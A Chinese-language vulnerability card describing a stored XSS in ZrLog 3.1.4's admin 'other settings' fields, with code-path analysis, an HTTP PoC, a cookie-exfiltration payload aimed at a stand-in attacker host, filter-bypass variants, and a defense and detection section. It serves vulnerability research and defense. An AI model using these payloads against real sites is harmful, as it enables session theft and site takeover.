---
id: web-generic-xss-zrlog-admin-otherwebsiteinfo-stored-config
title: ZrLog 后台「其他设置」OtherWebSiteInfo 三字段无过滤存储型 XSS：webCm 写入后在前台页面原样渲染
type: scenario
domain: web
path: web/generic/xss
technique: zrlog-admin-otherwebsiteinfo-stored-xss
tags:
- web
- xss
- stored-xss
- zrlog
- java
- admin-panel
- freemarker
- config-injection
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: 3.1.4
verification:
  verified_by: verifier-T2-1
  verified_at: '2026-11-07T23:23:46+08:00'
  notes: '已对照 content.md(130 行)与 img/01-20 核对：img/01 全局搜「统计」命中 OtherForm.tsx:52（<Form.Item name=webCm label=网站统计>、icp、robotRuleContent 三个 TextArea），img/02 为 OtherForm 表单源码，img/03 line23 为 axios.post(/api/admin/website/other, {...})，img/04 line63 为 router.addMapper(/api+ADMIN_URI_BASE_PATH+/website, WebSiteController.class)，img/05 为 @RefreshCache(onlyOnPostMethod=true) + other() 里 BeanUtil.convertWithValid(getRequest().getInputStream(), OtherWebSiteInfo.class) + return webSiteService.other()，img/06 为 private final WebSiteService webSiteService = new WebSiteService()，img/07 为 WebSiteService.other() 取 icp/webCm/robotRuleContent，逐项与卡内原理一致。img/09 前台 DOM 末尾 <div style=display:none> 后出现 <script>alert(/xss/)</script>、img/10 弹窗 /xss/、img/08 设置页填 <script>alert(/xss/)</script>，与卡内 PoC 的前台渲染片段与「Freemarker 未转义、全站生效」一致。img/13 抓包显示 POST /api/admin/website/other + Cookie: admin-token + application/json，与卡内 PoC 的请求形态一致（其 webCm 值当时为 123321 属另一次抓包，不影响结论）。未验证点：本机未复现，Freemarker 未用 ?html 与无 CSP 系依截图推断；affected_versions
    保留原文标题明确标注的 3.1.4（未 set-versions 亦未清除）。'
url: /docs/web/generic/xss/web-generic-xss-zrlog-admin-otherwebsiteinfo-stored-config/
draft: false
kb_aliases:
- ZrLog XSS
- ZrLog 网站统计 XSS
- OtherWebSiteInfo XSS
- webCm 存储型 XSS
- ZrLog 后台其他设置
---

## 一句话结论

ZrLog 3.1.4 后台「设置 → 其他设置」的 `icp`、`webCm`（网站统计）、`robotRuleContent` 三个字段从 `POST /api/admin/website/other` 经 `BeanUtil.convertWithValid` 直接写入配置，`WebSiteService.other()` 读回时不做任何转义，前台模板再用 Freemarker 原样输出，因此在 `webCm` 里填 `<script>alert(1)</script>` 就能形成对所有访客生效的存储型 XSS。

## 原理

- **入口**：前端 `admin-web/src/main/frontend/src/components/website/OtherForm.tsx` 使用 Ant Design `Form.Item` + `TextArea` 收集 `icp`/`webCm`/`robotRuleContent`，通过 `axios.post("/api/admin/website/other", {...})` 提交。React 只对 JSX 直接插值做转义，`TextArea` 仅负责收集字符串，不构成输出过滤。
- **路由**：`AdminRouters` 里 `router.addMapper("/api" + Constants.ADMIN_URI_BASE_PATH + "/website", WebSiteController.class)`，`WebSiteController` 的 `other()` 标注 `@RefreshCache(onlyOnPostMethod = true)`，POST 时执行 `update(BeanUtil.convertWithValid(getRequest().getInputStream(), OtherWebSiteInfo.class))`，随后 `return new ApiStandardResponse<>(webSiteService.other(), ...)`。
- **服务层**：`WebSiteService.other()` 直接从 `Constants.zrLogConfig.getPublicWebSite()` 里 `get("icp")`/`get("webCm")`/`get("robotRuleContent")` 并 `set` 进 `OtherWebSiteInfo` 返回。整条链路没有任何 HTML 转义、标签黑名单或长度/字符白名单 —— `convertWithValid` 只做 Bean 字段映射与基础校验。
- **输出**：博客前台页面把网站统计内容写进模板输出（截图里在 `<body>` 末尾的 `<div style="display:none">` 之后直接出现 `<script>alert(/xss/)</script>`），Freemarker 默认不做 HTML 转义（未用 `?html`），所以脚本被浏览器执行。
- **为什么持久且影响所有访客**：内容落在站点级配置里，不是单篇文章；任何访问首页/文章页的访客都会加载该脚本，属于典型的「低权或管理员写一次、全站长期触发」。

## 触发条件

- 目标为 ZrLog 3.1.4（或同样未修复的版本），后台「其他设置」接口可访问且当前账号已登录（该接口在 `/api/admin/` 下，需管理员会话）。
- 前台模板对 `webCm` 等配置值直接输出、未做 HTML 转义，且响应无禁止内联脚本的 CSP。
- 攻击者要么本身是管理员/拥有设置权限，要么通过 CSRF 让在线管理员代为写入（见关联的 JSON CSRF 卡）。

## 利用步骤

1. 登录后台，进入「设置 → 其他设置」，确认 `网站统计` 是普通多行文本框。
2. 在 `网站统计` 填入探测 payload `<script>alert(1)</script>` 并提交；或直接对 `/api/admin/website/other` 发 POST，body 为 `{"icp":"","webCm":"<script>alert(1)</script>","robotRuleContent":""}`。
3. 查看响应 `data.webCm` 是否原样返回 payload；若返回，说明无输入过滤。
4. 打开博客前台首页，查看 DOM（如 `<body>` 尾部 `<div style="display:none">` 之后）是否出现未转义的 `<script>`，确认执行。
5. 换成实际载荷：`<script>new Image().src='//attacker/?c='+document.cookie</script>`，或调用后台接口创建管理员/改配置；`<script>` 被拦时改用 `<img src=x onerror=...>`。

## PoC

```http
POST /api/admin/website/other HTTP/1.1
Host: target
Content-Type: application/json
Cookie: admin-token=<管理员会话>

{"icp":"","webCm":"<script>alert(1)</script>","robotRuleContent":""}
```

响应回显（证明未过滤）：

```json
{"data":{"icp":"","webCm":"<script>alert(1)</script>","robotRuleContent":""},"error":0,"message":"更新成功"}
```

前台渲染结果（浏览器实际收到）：

```html
<div style="display:none">
<script>alert(/xss/)</script>
```

## 变体与关联

- 变体：同一 `OtherWebSiteInfo` 下的 `icp`、`robotRuleContent` 同属一类无过滤配置字段；`robotRuleContent` 会被写成 `robots.txt`，若下游有解析/展示也可能触发。
- 变体：payload 用 `<img src=1 onerror=alert(1)>`、`<svg/onload=...>`、`<details open ontoggle=...>`、HTML 实体/大小写变形绕过弱黑名单；写进 `style` 上下文时改用 `</div><script>`。
- 关联：[[web-generic-csrf-json-text-plain-form-enctype]]（把该接口变成跨站写入的 CSRF 卡）、[[web-generic-xss-spring-rbac-user-dept-name-stored]]（同为后台配置/名称类存储型 XSS）。
- 边界：前台若改为 `?html` 转义、加 CSP 禁内联、或该字段改成富文本白名单 sanitizer，则失效；仅管理员可利用时风险等级降为「后台自伤/配合 CSRF」。

## 检测与防御

- 输入侧：对 `icp`/`webCm`/`robotRuleContent` 做长度与字符白名单，拒绝 `<`、`>` 等标签字符；服务端不要只依赖前端表单校验。
- 输出侧：Freemarker 输出处统一加 `?html`（或用 `<#escape>` 包围），富文本场景用 DOMPurify 类白名单 sanitizer；`webCm` 这类「统计脚本」字段如需允许 JS，应改为结构化配置（脚本 URL 白名单）而不是自由文本。
- 会话与浏览器：Cookie 设 `HttpOnly`、`SameSite`；部署 CSP（禁 `unsafe-inline`、限制 script-src）；后台设置接口加 CSRF Token。
- 检测：`/api/admin/website/other` 请求体出现 `<script`、`onerror=`、`onload=`、`javascript:`；配置表中 `webCm` 含 HTML 标签；前台响应体出现非预期内联脚本。
